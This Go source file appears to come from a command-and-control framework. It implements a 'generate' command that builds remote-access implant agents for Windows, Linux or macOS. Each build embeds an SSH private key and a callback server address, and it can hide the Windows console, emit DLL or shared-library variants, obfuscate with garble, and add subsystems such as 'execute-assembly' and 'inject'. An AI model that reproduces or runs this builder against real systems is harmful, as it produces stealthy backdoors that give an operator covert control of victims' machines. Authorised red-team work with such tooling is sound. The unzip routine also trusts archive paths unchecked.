package agentcmd

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"rscc"
	"rscc/internal/common/constants"
	"rscc/internal/common/pprint"
	"rscc/internal/common/utils"
	"rscc/internal/common/validators"
	"rscc/internal/sshd"
	"runtime"
	"strconv"
	"strings"
	"text/template"

	"github.com/cespare/xxhash/v2"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

type BuilderConfig struct {
	IsDebug bool
}

func (a *AgentCmd) newCmdGenerate() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "generate",
		Short:   "Generate an agent",
		Aliases: []string{"g", "gen"},
		Args:    cobra.NoArgs,
		RunE:    a.cmdGenerate,
	}
	cmd.Flags().StringP("name", "n", utils.GetRandomName(), "agent name (random if not provided)")
	cmd.Flags().StringP("os", "o", runtime.GOOS, "operating system (linux, windows, darwin)")
	cmd.Flags().StringP("arch", "a", runtime.GOARCH, "architecture (amd64, arm64)")
	cmd.Flags().StringP("server", "s", "", "server address (e.g. 127.0.0.1:8080)")
	cmd.Flags().Bool("shared", false, "generate a shared library")
	cmd.Flags().Bool("pie", false, "generate a position independent executable")
	cmd.Flags().Bool("garble", false, "use garble to obfuscate agent")
	cmd.Flags().StringSlice("ss", []string{}, "subsystems to add to the agent (e.g. execute-assembly, inject, sleep)")
	cmd.MarkFlagsMutuallyExclusive("shared", "pie")
	cmd.MarkFlagRequired("server")

	return cmd
}

func (a *AgentCmd) cmdGenerate(cmd *cobra.Command, args []string) error {
	// Get flags
	name, err := cmd.Flags().GetString("name")
	if err != nil {
		return err
	}
	goos, err := cmd.Flags().GetString("os")
	if err != nil {
		return err
	}
	goarch, err := cmd.Flags().GetString("arch")
	if err != nil {
		return err
	}
	server, err := cmd.Flags().GetString("server")
	if err != nil {
		return err
	}
	shared, err := cmd.Flags().GetBool("shared")
	if err != nil {
		return err
	}
	pie, err := cmd.Flags().GetBool("pie")
	if err != nil {
		return err
	}
	garble, err := cmd.Flags().GetBool("garble")
	if err != nil {
		return err
	}
	ss, err := cmd.Flags().GetStringSlice("ss")
	if err != nil {
		return err
	}

	// Validate flags
	if !validators.ValidateGOOS(goos) {
		return fmt.Errorf("invalid operating system: %s", goos)
	}
	if !validators.ValidateGOARCH(goarch) {
		return fmt.Errorf("invalid architecture: %s", goarch)
	}
	if !validators.ValidateAddr(server) {
		return fmt.Errorf("invalid server address: %s", server)
	}
	if !validators.ValidateSybsystem(ss) {
		return fmt.Errorf("invalid subsystems: %v", ss)
	}
	name = strings.ReplaceAll(strings.TrimSpace(name), " ", "-")

	// Check database
	agent, err := a.db.GetAgentByName(cmd.Context(), name)
	if err == nil && agent != nil {
		return fmt.Errorf("agent `%s` already exists", name)
	}

	// Check if agent with same name already exists
	if _, err := os.Stat(filepath.Join(constants.AgentDir, name)); !os.IsNotExist(err) {
		cmd.Println(pprint.Warn("Agent `%s` not found in database, but file `%s` exists. File `%s` will be replaced", name, filepath.Join(constants.AgentDir, name), filepath.Join(constants.AgentDir, name)))
	}

	// Generate keys
	privKey, err := sshd.GeneratePrivateKey()
	if err != nil {
		return fmt.Errorf("failed to generate private key: %w", err)
	}
	signer, err := ssh.ParsePrivateKey(privKey)
	if err != nil {
		return fmt.Errorf("failed to generate public key: %w", err)
	}
	pubKey := signer.PublicKey().Marshal()

	// Unzip agent
	tmpDir, err := unzipAgent()
	if err != nil {
		return fmt.Errorf("failed to unzip agent: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// template agent
	if err := templateAgent(tmpDir); err != nil {
		return fmt.Errorf("failed to template agent: %s", err.Error())
	}

	// Build agent
	cmd.Println(pprint.Info("Building agent `%s` for %s/%s (server: %s)", name, goos, goarch, server))
	name, err = buildAgent(tmpDir, name, goos, goarch, server, privKey, shared, pie, garble)
	if err != nil {
		return fmt.Errorf("failed to build agent: %w", err)
	}

	// Get agent hash
	agentBytes, err := os.ReadFile(filepath.Join(constants.AgentDir, name))
	if err != nil {
		return fmt.Errorf("failed to read agent: %w", err)
	}
	agentHash := strconv.FormatUint(xxhash.Sum64(agentBytes), 10)

	// Add agent to database
	agent, err = a.db.CreateAgent(cmd.Context(), name, goos, goarch, server, shared, pie, garble, ss, pubKey, agentHash)
	if err != nil {
		return fmt.Errorf("failed to add agent to database: %w", err)
	}

	cmd.Println(pprint.Success("Agent `%s` [id: %s] generated (%s)", agent.Name, agent.ID, filepath.Join("./agents", name)))
	return nil
}

func unzipAgent() (string, error) {
	tempDir, err := os.MkdirTemp("", "rscc-agent-*")
	if err != nil {
		return "", fmt.Errorf("create temp dir: %w", err)
	}

	zipReader, err := zip.NewReader(bytes.NewReader(rscc.ZipAgentSource), int64(len(rscc.ZipAgentSource)))
	if err != nil {
		return "", fmt.Errorf("create zip reader: %w", err)
	}

	for _, file := range zipReader.File {
		filePath := filepath.Join(tempDir, file.Name)

		// If directory
		if file.FileInfo().IsDir() {
			err = os.MkdirAll(filePath, 0777)
			if err != nil {
				return "", fmt.Errorf("create dir: %w", err)
			}
			continue
		}

		// Open zipped file
		rc, err := file.Open()
		if err != nil {
			return "", fmt.Errorf("open zipped file: %w", err)
		}
		defer rc.Close()

		// Create unzipped file
		unzippedFile, err := os.Create(filePath)
		if err != nil {
			return "", fmt.Errorf("create unzipped file: %w", err)
		}
		defer unzippedFile.Close()

		// Copy file content
		_, err = io.Copy(unzippedFile, rc)
		if err != nil {
			return "", fmt.Errorf("copy file content: %w", err)
		}
	}

	return tempDir, nil
}

// templateAgent templates agent source code
func templateAgent(dir string) error {
	return filepath.WalkDir(dir, func(fsPath string, f fs.DirEntry, err error) error {
		if f.IsDir() {
			// ignore directory
			return nil
		}

		// TODO: ignore vendor directory
		if strings.Contains(fsPath, "vendor") {
			return nil
		}

		// TODO: check extension in the better way
		if !strings.Contains(fsPath, ".go") {
			return nil
		}

		// get raw code
		rawCode, err := os.ReadFile(fsPath)
		if err != nil {
			return err
		}

		// create template
		code := template.New("rscc")
		code, err = code.Parse(string(rawCode))
		if err != nil {
			return err
		}

		// generate code
		buf := bytes.NewBuffer([]byte{})
		if err := code.Execute(buf, struct {
			Config *BuilderConfig
		}{
			Config: &BuilderConfig{
				IsDebug: true,
			},
		}); err != nil {
			return err
		}

		// write code
		if err := os.WriteFile(fsPath, buf.Bytes(), os.ModePerm); err != nil {
			return err
		}
		return nil
	})
}

func buildAgent(tmpDir, name, goos, goarch, server string, privKey []byte, shared, pie, garble bool) (string, error) {
	// Check go toolchain
	goCmd := exec.Command("go", "version")
	output, err := goCmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("check go version: %w", err)
	}
	if !strings.Contains(string(output), "go version") {
		return "", fmt.Errorf("go toolchain not found (install from https://go.dev/doc/install)")
	}

	// Check garble
	if garble {
		garbleCmd := exec.Command("garble", "version")
		output, err = garbleCmd.CombinedOutput()
		if err != nil {
			return "", fmt.Errorf("check garble version: %w", err)
		}
		if !strings.Contains(string(output), "Build settings") {
			return "", fmt.Errorf("garble not found (install from https://github.com/burrowers/garble)")
		}
	}

	// Rename agent
	if goos == "windows" {
		if shared {
			name = fmt.Sprintf("%s.dll", name)
		} else {
			name = fmt.Sprintf("%s.exe", name)
		}
	}
	if goos == "darwin" {
		if shared {
			name = fmt.Sprintf("lib%s.dylib", name)
		}
	}
	if goos == "linux" {
		if shared {
			name = fmt.Sprintf("lib%s.so", name)
		}
	}

	currentDir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("get current dir: %w", err)
	}
	privKeyBase64 := base64.StdEncoding.EncodeToString(privKey)

	// Set ldflags
	ldflags := "-s -w"
	if goos == "windows" {
		ldflags = fmt.Sprintf("%s -H windowsgui", ldflags)
	}

	ldflags = fmt.Sprintf("%s -X main.privKey=%s", ldflags, privKeyBase64)
	ldflags = fmt.Sprintf("%s -X main.serverAddress=%s", ldflags, server)
	ldflags = fmt.Sprintf("%s -buildid=", ldflags)

	// Additionnal buildMode
	buildMode := ""
	switch {
	case shared:
		buildMode = "-buildmode=c-shared"
	case pie:
		buildMode = "-buildmode=pie"
	default:
		buildMode = "-buildmode=default"
	}

	// Build agent
	var cmd *exec.Cmd
	if garble {
		cmd = exec.Command(
			"garble",
			"-tiny",
			"-seed=random",
			"-literals",
			"build",
			"-o",
			filepath.Join(currentDir, "agents", name),
			"-mod=vendor",
			"-trimpath",
			fmt.Sprintf("-ldflags=%s", ldflags),
			buildMode,
			"cmd/agent/main.go",
		)
	} else {
		cmd = exec.Command(
			"go",
			"build",
			"-o",
			filepath.Join(currentDir, "agents", name),
			"-mod=vendor",
			"-trimpath",
			fmt.Sprintf("-ldflags=%s", ldflags),
			buildMode,
			"cmd/agent/main.go",
		)
	}
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch)

	// Run command
	output, err = cmd.CombinedOutput()
	if err != nil {
		err = fmt.Errorf("run build: %w", err)
		if len(output) > 0 {
			err = fmt.Errorf("%w:\n%s", err, string(output))
		}
		return "", err
	}

	return name, nil
}
